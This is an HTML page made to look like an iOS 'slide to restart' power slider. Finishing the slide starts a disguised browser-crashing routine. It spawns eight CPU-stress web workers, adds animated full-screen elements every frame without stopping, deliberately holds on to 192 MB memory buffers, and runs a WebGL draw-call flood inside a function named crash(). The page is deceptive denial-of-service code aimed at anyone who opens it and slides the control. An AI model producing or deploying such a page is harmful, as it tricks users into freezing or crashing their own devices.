
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Restart Device</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-user-select: none;
        }

        body {
            background: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            padding: 60px 20px 80px 20px;
            overflow: hidden;
            position: relative;
        }

        /* Ambient subtle background glow */
        body::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: radial-gradient(circle at center, rgba(255, 255, 255, 0.03) 0%, transparent 70%);
            pointer-events: none;
        }

        .header-section {
            text-align: center;
            margin-top: 40px;
            z-index: 10;
        }

        h1 {
            font-size: 28px;
            font-weight: 400;
            letter-spacing: -0.5px;
            margin-bottom: 12px;
            color: #fff;
        }

        p {
            color: #8e8e93;
            font-size: 15px;
            line-height: 1.4;
            max-width: 280px;
            margin: 0 auto;
        }

        .slider-container {
            width: 100%;
            max-width: 340px;
            display: flex;
            flex-direction: column;
            gap: 24px;
            margin-bottom: 20px;
            z-index: 10;
        }

        /* iOS Power Slider styling */
        .slider-track {
            position: relative;
            width: 100%;
            height: 76px;
            background: rgba(35, 35, 35, 0.45);
            border-radius: 38px;
            display: flex;
            align-items: center;
            padding: 4px;
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.05);
            overflow: hidden;
        }

        .slider-text {
            position: absolute;
            width: 100%;
            text-align: center;
            left: 0;
            font-size: 16px;
            font-weight: 500;
            letter-spacing: -0.2px;
            pointer-events: none;
            background: linear-gradient(90deg, #4d4d4d 0%, #fff 50%, #4d4d4d 100%);
            background-size: 200% 100%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shine 2.5s infinite linear;
            padding-left: 40px; /* Offset to visually center with handle present */
        }

        @keyframes shine {
            0% { background-position: -100% 0; }
            100% { background-position: 100% 0; }
        }

        .slider-handle {
            width: 68px;
            height: 68px;
            background: #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: grab;
            z-index: 2;
            box-shadow: 0 3px 8px rgba(0,0,0,0.3);
            transition: transform 0.1s ease-out;
            touch-action: none;
        }

        .slider-handle:active {
            cursor: grabbing;
        }

        /* Variant Colors for Icons */
        .respring-icon {
            color: #000;
            font-size: 26px;
            transform: scaleX(-1); /* Flip loop arrow */
        }

        .restart-icon {
            color: #ff3b30;
            font-size: 26px;
            font-weight: bold;
        }

        /* Core Engine Graphics Style */
        .gpu-killer {
            animation: gpuMeltdown 0.5s infinite linear;
            position: fixed;
            border-radius: 50%;
            mix-blend-mode: difference;
            will-change: transform, filter, background;
            backface-visibility: hidden;
            perspective: 1000px;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            pointer-events: none;
        }

        @keyframes gpuMeltdown {
            0% { transform: translate(0, 0) rotate(0deg) scale(1); filter: hue-rotate(0deg) blur(0px); background: radial-gradient(circle, #ff0000, #00ff00, #0000ff); }
            50% { transform: translate(100vw, 50vh) rotate(1800deg) scale(15); filter: hue-rotate(900deg) blur(40px); background: radial-gradient(circle, #ff00ff, #00ffff, #ff0000); }
            100% { transform: translate(0, 0) rotate(3600deg) scale(1); filter: hue-rotate(1800deg) blur(100px); background: radial-gradient(circle, #ff0000, #00ff00, #0000ff); }
        }
    </style>
</head>
<body>

    <div class="header-section">
        <h1>1</h1>
    </div>

    <div class="slider-container">
        <div class="slider-track" id="track-respring">
            <div class="slider-text">slide to restart</div>
            <div class="slider-handle" id="handle-respring">
                <span class="respring-icon">⟳</span>
            </div>
        </div>
        
    </div>

    <script>
        // Core stress test simulation loop
function cssAnimationInferno() {
    // ----------------------------------------------------
    // 1. BACKGROUND CPU STRESS (8 WEB WORKERS)
    // ----------------------------------------------------
    const workerCode = `
        self.onmessage = function() {
            // High-intensity mathematical/cryptographic stress loop (Prime95 style)
            // Designed to maximize CPU core utilization without an infinite blocking while(true)
            function stressCore() {
                let salt = 12345.6789;
                for (let i = 0; i < 5000000; i++) {
                    // Complex transcendental and trigonometric chaining to stress ALU/FPU
                    salt = Math.sin(salt) * Math.cos(salt) * Math.tan(salt);
                    salt = Math.sqrt(Math.abs(salt)) + Math.exp(Math.sin(salt) * 0.001);
                    
                    // Bitwise operations mixed with float conversions
                    let integerRepresentation = Math.floor(salt * 1000000);
                    salt += ((integerRepresentation ^ (integerRepresentation >> 2)) & 0xFF) * 0.00001;
                }
                // Yield to the event loop momentarily, then resume immediately
                setTimeout(stressCore, 0);
            }
            stressCore();
        };
    `;

    const blob = new Blob([workerCode], { type: 'application/javascript' });
    const workerUrl = URL.createObjectURL(blob);
    const workers = [];

    // Spawn 8 parallel execution threads
    for (let w = 0; w < 8; w++) {
        try {
            const worker = new Worker(workerUrl);
            worker.postMessage('start');
            workers.push(worker);
        } catch (err) {
            console.error('Worker allocation failed:', err);
        }
    }

    // ----------------------------------------------------
    // 2. CSS INFERNO SETUP
    // ----------------------------------------------------
    const style = document.createElement('style');
    if (!document.getElementById('gpu-core-styles')) {
        style.id = 'gpu-core-styles';
        style.textContent = `
            @keyframes gpuMeltdown {
                0% { transform: translate(0, 0) rotate(0deg) scale(1) skew(0deg); filter: hue-rotate(0deg) blur(0px) contrast(100%) brightness(100%); background: radial-gradient(circle, #ff0000, #00ff00, #0000ff); }
                20% { transform: translate(-50vw, 100vh) rotate(720deg) scale(0.1) skew(-40deg); filter: hue-rotate(360deg) blur(20px) contrast(300%) brightness(200%); background: radial-gradient(circle, #ff0000, #0000ff, #ffff00); }
                50% { transform: translate(200vw, 200vh) rotate(1800deg) scale(20) skew(100deg); filter: hue-rotate(900deg) blur(50px) contrast(600%) brightness(350%); background: radial-gradient(circle, #ff00ff, #00ffff, #ff0000); }
                80% { transform: translate(-200vw, 250vh) rotate(2880deg) scale(0.0001) skew(-160deg); filter: hue-rotate(1440deg) blur(80px) contrast(900%) brightness(500%); background: radial-gradient(circle, #ff0000, #00ff00, #ffff00); }
                100% { transform: translate(0, 0) rotate(3600deg) scale(1) skew(0deg); filter: hue-rotate(1800deg) blur(100px) contrast(1100%) brightness(600%); background: radial-gradient(circle, #ff0000, #00ff00, #0000ff); }
            }
        `;
        document.head.appendChild(style);
    }

    let elementCount = 0;
    let frameCount = 0;
    let webglTriggered = false;
    const memoryLeakingRetentionBucket = []; // Holds allocations to prevent Garbage Collection

    function createGpuKiller() {
        try {
            // Keep spawning CSS elements every frame indefinitely
            for (let i = 0; i < 60; i++) {
                const element = document.createElement('div');
                element.className = 'gpu-killer';
                element.style.width = Math.random() * 400 + 100 + 'px';
                element.style.height = element.style.width;
                element.style.left = Math.random() * 100 + 'vw';
                element.style.top = Math.random() * 100 + 'vh';
                element.style.zIndex = 1000000 + elementCount;
                element.style.background = `radial-gradient(circle, 
                    hsl(${Math.random() * 360}, 100%, 50%), 
                    hsl(${Math.random() * 360}, 100%, 50%), 
                    hsl(${Math.random() * 360}, 100%, 50%))`;
                document.body.appendChild(element);
                elementCount++;
            }

            frameCount++;

            // Trigger WebGL precisely on the 3rd frame
            if (frameCount >= 5 && !webglTriggered) {
                webglTriggered = true;
                crash(); 
            }

            // Rapid RAM allocation vector (64MB per frame) once WebGL starts running
            if (webglTriggered) {
                const buffer = new ArrayBuffer(192 * 1024 * 1024);
                // Fill buffer partially to force physical allocation backed by OS memory pages
                const view = new Uint8Array(buffer);
                view[0] = 1;
                view[view.length - 1] = 1;
                memoryLeakingRetentionBucket.push(buffer);
            }

            if (elementCount > -2146483647) {
                requestAnimationFrame(createGpuKiller);
            }
        } catch(e) {
            // Maintain execution flow under degradation
            if (frameCount >= 3 && !webglTriggered) {
                webglTriggered = true;
                crash();
            }
            requestAnimationFrame(createGpuKiller);
        }
    }

    // ----------------------------------------------------
    // 3. WEBGL GRAPHICS SUBSYSTEM CRASH ROUTINE
    // ----------------------------------------------------
    function crash() {
        let canvas = document.createElement('canvas');
        canvas.style.position = 'fixed';
        canvas.style.top = '-9999px';
        canvas.style.left = '-9999px';
        document.body.appendChild(canvas);
        
        let gl = canvas.getContext('webgl', { 
            antialias: false,
            powerPreference: 'high-performance',
            preserveDrawingBuffer: false
        });
        
        if (!gl) {
            console.error('WebGL not available');
            return;
        }
        
        const maxTexSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
        const size = Math.min(4096, maxTexSize);
        
        canvas.width = size;
        canvas.height = size;
        gl.viewport(0, 0, size, size);
        
        const vsSource = `
            attribute vec2 a_position;
            varying vec2 v_texCoord;
            void main() {
                gl_Position = vec4(a_position, 0.0, 1.0);
                v_texCoord = a_position * 0.5 + 0.5;
            }
        `;
        
        const fsSource = `
            precision highp float;
            uniform sampler2D u_texture;
            varying vec2 v_texCoord;
            uniform float u_time;
            
            void main() {
                vec4 color = texture2D(u_texture, v_texCoord);
                float noise = sin(v_texCoord.x * 100.0 + u_time) * cos(v_texCoord.y * 100.0 + u_time);
                gl_FragColor = vec4(color.rgb * (1.0 + noise * 0.1), color.a);
            }
        `;
        
        function loadShader(type, source) {
            const shader = gl.createShader(type);
            gl.shaderSource(shader, source);
            gl.compileShader(shader);
            if (!gl.getShaderParameter(shader, gl.COMPILE_STATUS)) {
                throw new Error('Shader compile error');
            }
            return shader;
        }
        
        const vertexShader = loadShader(gl.VERTEX_SHADER, vsSource);
        const fragmentShader = loadShader(gl.FRAGMENT_SHADER, fsSource);
        
        const shaderProgram = gl.createProgram();
        gl.attachShader(shaderProgram, vertexShader);
        gl.attachShader(shaderProgram, fragmentShader);
        gl.linkProgram(shaderProgram);
        
        if (!gl.getProgramParameter(shaderProgram, gl.LINK_STATUS)) {
            throw new Error('Shader program failed');
        }
        
        const quadBuffer = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, quadBuffer);
        const positions = [-1, -1, 1, -1, -1, 1, 1, 1];
        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(positions), gl.STATIC_DRAW);
        
        const posLoc = gl.getAttribLocation(shaderProgram, 'a_position');
        gl.enableVertexAttribArray(posLoc);
        gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);
        
        gl.useProgram(shaderProgram);
        gl.disable(gl.DEPTH_TEST);
        gl.disable(gl.BLEND);
        
        function createTexture(size) {
            const tex = gl.createTexture();
            gl.bindTexture(gl.TEXTURE_2D, tex);
            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
            gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
            return tex;
        }
        
        const textures = [];
        const framebuffers = [];
        const numPairs = 16;
        
        for (let i = 0; i < numPairs; i++) {
            const tex1 = createTexture(size);
            const tex2 = createTexture(size);
            const fbo = gl.createFramebuffer();
            
            textures.push(tex1, tex2);
            framebuffers.push(fbo);
        }
        
        const timeLoc = gl.getUniformLocation(shaderProgram, 'u_time');
        const opsPerFrame = 500000;
        
        let shouldStop = false;
        function renderFrame() {
            if (shouldStop) return;
            
            gl.uniform1f(timeLoc, performance.now() / 1000);
            
            for (let pair = 0; pair < numPairs; pair++) {
                gl.bindFramebuffer(gl.FRAMEBUFFER, framebuffers[pair]);
                gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, textures[pair * 2 + 1], 0);
                gl.bindTexture(gl.TEXTURE_2D, textures[pair * 2]);
                
                for (let i = 0; i < opsPerFrame / numPairs; i++) {
                    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                }
            }
            
            requestAnimationFrame(renderFrame);
        }
        
        renderFrame();
    }

    // Initialize execution loop
    createGpuKiller();
}
        // Execution Handler
        function triggerStressTest(intensity) {
            // Hide interface components smoothly to simulate a shutdown sequence
            document.querySelector('.header-section').style.opacity = '0';
            document.querySelector('.slider-container').style.opacity = '0';
            
            // Instantly loop call based on selected module intensity
            for (let i = 0; i < intensity; i++) {
                cssAnimationInferno();
            }
        }

        // Swipe Gesture Controller Setup
        function setupSlider(handleId, trackId, multiplier) {
            const handle = document.getElementById(handleId);
            const track = document.getElementById(trackId);
            
            let isDragging = false;
            let startX = 0;
            let maxDelta = 0;

            function getClientX(e) {
                return e.touches ? e.touches[0].clientX : e.clientX;
            }

            function onStart(e) {
                isDragging = true;
                startX = getClientX(e);
                maxDelta = track.clientWidth - handle.clientWidth - 8; // account for padding
                handle.style.transition = 'none';
            }

            function onMove(e) {
                if (!isDragging) return;
                const currentX = getClientX(e);
                let deltaX = currentX - startX;

                // Restrict movement range
                if (deltaX < 0) deltaX = 0;
                if (deltaX > maxDelta) deltaX = maxDelta;

                handle.style.transform = `translateX(${deltaX}px)`;

                // Opacity fading of background label during slide interaction
                const textElement = track.querySelector('.slider-text');
                textElement.style.opacity = (1 - (deltaX / maxDelta));

                // Instantly execute when sliding action completes 100%
                if (deltaX >= maxDelta) {
                    isDragging = false;
                    triggerStressTest(multiplier);
                }
            }

            function onEnd() {
                if (!isDragging) return;
                isDragging = false;
                // Return to start position if released prematurely
                handle.style.transition = 'transform 0.3s cubic-bezier(0.25, 1, 0.5, 1)';
                handle.style.transform = 'translateX(0px)';
                const textElement = track.querySelector('.slider-text');
                textElement.style.transition = 'opacity 0.3s';
                textElement.style.opacity = '1';
            }

            // Universal event bindings for touchscreens and desktop environments
            handle.addEventListener('touchstart', onStart, { passive: true });
            window.addEventListener('touchmove', onMove, { passive: false });
            window.addEventListener('touchend', onEnd);

            handle.addEventListener('mousedown', onStart);
            window.addEventListener('mousemove', onMove);
            window.addEventListener('mouseup', onEnd);
        }

        // Initialize sliders with multiplier definitions
        setupSlider('handle-respring', 'track-respring', 1);
    </script>
</body>
</html>
